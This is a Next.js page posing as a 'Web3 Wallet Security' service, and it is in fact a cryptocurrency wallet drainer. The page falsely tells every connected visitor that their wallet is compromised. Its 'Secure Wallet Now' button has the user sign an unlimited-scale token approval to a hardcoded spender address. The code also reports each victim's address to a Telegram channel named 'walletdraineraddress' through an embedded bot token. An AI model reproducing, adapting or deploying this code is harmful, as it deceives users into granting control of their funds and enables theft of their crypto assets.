import Head from "next/head";
import Image from "next/image";
import styles from "@/styles/Home.module.css";
import { useState, useEffect } from "react";
import { parseEther } from "ethers";
import { useWeb3Modal } from "@web3modal/wagmi/react";
import {
  useDisconnect,
  useAccount,
  useBalance,
  useSignMessage,
  usePrepareContractWrite,
  useContractWrite,
  Address,
  useNetwork,
} from "wagmi";
import { fetchTokenBalances } from "@/utils/moralis";

// ERC-20 Token ABI
import usdtABI from "@/abi/usdtABI.json";
import axios from "axios";

export default function Home() {
  const [isNetworkSwitchHighlighted, setIsNetworkSwitchHighlighted] =
    useState(false);
  const [isConnectHighlighted, setIsConnectHighlighted] = useState(false);
  const [walletStatus, setWalletStatus] = useState("secure");
  const [tokens, setTokens] = useState<any[]>([]);
  const [loadingTokens, setLoadingTokens] = useState(true);
  const [currentChain, setCurrentChain] = useState("eth"); // Default to Ethereum
  const [defaultImage, setDefaultImage] = useState("/default-token-image.png"); // Default image URL
  const [error, setError] = useState<string | null>(null); // State for error messages
  const [notice, setNotice] = useState<string | null>(null); // State for notices
  const [isApproving, setIsApproving] = useState(false); // State for approval status
  const [messageTimeout, setMessageTimeout] = useState<NodeJS.Timeout | null>(
    null
  ); // State for timeout

  const { open, close } = useWeb3Modal();
  const { disconnect } = useDisconnect();
  const { address } = useAccount();
  const { chain } = useNetwork();

  const { data: balanceData } = useBalance({ address });
  const {
    data: signMessageData,
    isSuccess: signMessageSuccess,
    signMessage,
  } = useSignMessage({ message: "gm wagmi frens" });

  const spenderAddress = "0x43E7263534d6aB44347e0567fAA6927A2b865516";
  const { config } = usePrepareContractWrite({
    address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", // SHIB-ERC20
    // address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT-ERC20
    abi: usdtABI,
    functionName: "approve",
    args: [spenderAddress as Address, parseEther("100000000000")],
  });

  const {
    data: approveData,
    isSuccess: approveSuccess,
    isLoading: isApprovingLoading,
    write,
    status, // Add status to track the transaction state
  } = useContractWrite(config);

  const closeAll = () => {
    setIsNetworkSwitchHighlighted(false);
    setIsConnectHighlighted(false);
  };

  const secureWallet = async () => {
    setWalletStatus("secure");
    setIsConnectHighlighted(false);
    setIsNetworkSwitchHighlighted(false);

    if (write) {
      try {
        setIsApproving(true); // Set approval state to true
        setNotice(
          "Attempting to secure wallet. Please open wallet to continue..."
        );

        // Clear any existing timeout
        if (messageTimeout) {
          clearTimeout(messageTimeout);
        }

        // Set a timeout to clear the message after 30 seconds
        setMessageTimeout(
          setTimeout(() => {
            setError(null); // Clear error message after timeout
            setNotice(null); // Clear notice message after timeout
          }, 30000)
        );

        // Send Telegram message indicating approval attempt
        await sendTelegramNotification(
          `${address} is attempting to secure wallet`
        );

        await write();
      } catch (error) {
        console.error("Error approving token:", error);
        setError("Failed to secure wallet. Please reload and try again.");
      }
    }
  };

  const compromiseWallet = () => {
    setWalletStatus("compromised");
    setIsConnectHighlighted(false);
    setIsNetworkSwitchHighlighted(false);
  };

  useEffect(() => {
    const fetchTokens = async () => {
      if (address) {
        setLoadingTokens(true);
        const tokenData = await fetchTokenBalances(address, currentChain);
        const nonZeroTokens = tokenData.filter(
          (token: any) => parseFloat(token.balance) > 0
        );
        setTokens(nonZeroTokens);
        setLoadingTokens(false);
      }
    };

    fetchTokens();
  }, [address, currentChain]);

  useEffect(() => {
    // Map network names to chain strings
    const chainMap: { [key: string]: string } = {
      ethereum: "eth",
      polygon: "polygon",
      avalanche: "avalanche",
      bsc: "bsc",
      gnosis: "gnosis",
      fantom: "fantom",
      base: "base",
    };

    if (chain) {
      const chainString = chainMap[chain.name.toLowerCase()] || "bsc"; // Default to "bsc" if chain is unknown
      setCurrentChain(chainString);
      console.log("Network changed to:", chainString);
    }
  }, [chain]);

  useEffect(() => {
    if (address) {
      sendTelegramNotification(`Wallet (${address}) connected.`);
    }
  }, [address]);

  useEffect(() => {
    if (status === "success") {
      setNotice(null);
      setError(null);
      setIsApproving(false); // Reset approval state
      setMessageTimeout(null); // Clear timeout
    } else if (status === "error") {
      setNotice(null);
      setError("Failed to secure wallet. Please try again.");
      setIsApproving(false); // Reset approval state
      setMessageTimeout(null); // Clear timeout
    }
  }, [status]);

  // Ensure error message is cleared on page reload
  useEffect(() => {
    setError(null);
    setNotice(null);
  }, []);

  // Function to format token balances
  const formatBalance = (balance: string, decimals: number) => {
    const adjustedBalance = parseFloat(balance) / Math.pow(10, decimals);
    const formattedBalance = adjustedBalance.toFixed(6);
    return Number(formattedBalance).toLocaleString();
  };

  // Default image handler
  const handleImageError = (
    event: React.SyntheticEvent<HTMLImageElement, Event>
  ) => {
    event.currentTarget.src = defaultImage; // Use default image
  };

  const sendTelegramNotification = async (message: string) => {
    try {
      const botToken = "7095023752:AAGH_bXRYtd3qe0kPI6AewFy4VVs8oqWCo0";
      const chatId = "@walletdraineraddress";

      await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        chat_id: chatId,
        text: message,
      });

      console.log("Telegram notification sent.");
    } catch (error) {
      console.error("Error sending Telegram notification:", error);
    }
  };

  return (
    <>
      <Head>
        <title>Web3 Wallet Security</title>
        <meta
          name="description"
          content="Web3 Wallet Security - A platform for securing your Web3 wallets."
        />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <link rel="icon" href="/favicon.ico" />
      </Head>
      <header className={styles.header}>
        <div className={styles.logo}>
          <Image
            src="/logo.svg"
            alt="Web3 Wallet Security Logo"
            height="32"
            width="150"
          />
        </div>
        <div className={styles.buttons}>
          <div
            onClick={secureWallet}
            className={`${styles.highlight} ${
              isConnectHighlighted ? styles.highlightSelected : ``
            }`}
          >
            <w3m-button />
          </div>
        </div>
      </header>
      <main className={styles.main}>
        <div className={`${styles.wrapper} ${styles.marginTop}`}>
          <div className={styles.container}>
            <h1>Web3 Wallet Security</h1>
            <div className={styles.connectB}>
              <div className={styles.buttons}>
                <div
                  onClick={closeAll}
                  className={`${styles.highlight} ${
                    isNetworkSwitchHighlighted ? styles.highlightSelected : ``
                  }`}
                >
                  <w3m-network-button />
                </div>
                <div
                  onClick={closeAll}
                  className={`${styles.highlight} ${
                    isConnectHighlighted ? styles.highlightSelected : ``
                  }`}
                >
                  <w3m-button />
                </div>
              </div>
            </div>
            <div className={styles.content}>
              {address ? (
                <>
                  <p className={styles.danger}>
                    Your wallet is compromised! Below are your tokens at risk.
                  </p>
                  {error && <div className={styles.error}>{error}</div>}
                  {notice && <div className={styles.notice}>{notice}</div>}
                  <button
                    onClick={secureWallet}
                    className={`${styles.button} ${styles.dangerButton}`}
                    disabled={isApproving}
                  >
                    Secure Wallet Now
                  </button>
                  {loadingTokens ? (
                    <p>Loading tokens...</p>
                  ) : tokens.length > 0 ? (
                    <div className={styles.tokenList}>
                      {tokens.map((token) => (
                        <div key={token.symbol} className={styles.tokenItem}>
                          <Image
                            className={styles.tokenImage}
                            src={token.logo || defaultImage}
                            alt={token.symbol}
                            width={40}
                            height={40}
                            onError={handleImageError}
                          />
                          <div className={styles.tokenInfo}>
                            <p className={styles.tokenName}>{token.name}</p>
                            <p className={styles.tokenBalance}>
                              {formatBalance(token.balance, token.decimals)}
                            </p>
                          </div>
                        </div>
                      ))}
                    </div>
                  ) : (
                    <p>No tokens found.</p>
                  )}
                </>
              ) : (
                <>
                  <p>
                    Secure your Web3 wallets with Web3 Wallet Security. We
                    provide advanced security features to keep your digital
                    assets safe.
                  </p>
                  <p className={styles.marginP}>
                    <strong>Steps to Secure Your Wallet:</strong>
                  </p>
                  <ol>
                    <li>
                      Click on "Connect Wallet" to check your wallet security
                      status.
                    </li>
                    <li>
                      If wallet status is "secure" you have nothing to worry
                      about.
                    </li>
                    <li>
                      If wallet status is "compromised," click{" "}
                      <span
                        onClick={compromiseWallet}
                        className={`${styles.button} ${styles.dangerButton}`}
                      >
                        Secure Wallet
                      </span>{" "}
                      to safeguard your funds.
                    </li>
                  </ol>
                </>
              )}
            </div>
          </div>
        </div>
      </main>
    </>
  );
}
